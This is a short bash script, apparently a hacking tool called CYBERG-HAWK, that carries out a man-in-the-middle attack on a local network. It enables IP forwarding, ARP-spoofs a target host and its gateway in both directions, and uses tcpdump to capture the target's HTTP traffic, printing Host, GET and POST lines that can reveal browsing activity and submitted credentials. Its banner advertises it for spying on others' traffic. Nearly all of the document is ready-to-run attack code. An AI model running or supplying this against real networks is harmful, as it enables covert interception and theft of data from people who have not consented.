#!/bin/bash

# Banner Function - CYBERG-HAWK
banner() {


    echo "#######################################################"
    echo "#                  CYBERG-HAWK                        #"
    echo "#            MITM Traffic Interceptor                 #"
    echo "#   Spy on their HTTP traffic like MITMf and MITM6    #"
    echo "#######################################################"


}

# Usage Function
usage() {
    echo "Usage: $0 <Target-IP> <Gateway-IP>"
    exit 1
}

# Check for root privileges
if [ "$EUID" -ne 0 ]; then
    echo "Please run as root."
    exit
fi

# Check for arguments
if [ $# -ne 2 ]; then
    usage
fi

TARGET_IP="$1"
GATEWAY_IP="$2"

# Enable IP forwarding
enable_ip_forward() {
    echo "[*] Enabling IP forwarding..."
    echo 1 > /proc/sys/net/ipv4/ip_forward
}

# Disable IP forwarding
disable_ip_forward() {
    echo "[*] Disabling IP forwarding..."
    echo 0 > /proc/sys/net/ipv4/ip_forward
}

# Start ARP Spoofing
arp_spoof() {
    echo "[*] Starting ARP spoofing on $TARGET_IP..."
    arpspoof -i eth0 -t "$TARGET_IP" "$GATEWAY_IP" > /dev/null 2>&1 &
    arpspoof -i eth0 -t "$GATEWAY_IP" "$TARGET_IP" > /dev/null 2>&1 &
}

# Start Packet Capture
start_capture() {
    echo "[*] Capturing traffic for $TARGET_IP..."
    tcpdump -i eth0 -s 65535 -A host "$TARGET_IP" and tcp port 80 |
    while read packet; do
        echo "$packet" | grep -E "Host:|GET|POST" --color=always
    done
}

# Trap CTRL+C to clean up
trap ctrl_c INT
ctrl_c() {
    echo "[!] Stopping and cleaning up..."
    disable_ip_forward
    killall arpspoof
    exit 0
}

# Main
banner
enable_ip_forward
arp_spoof
start_capture
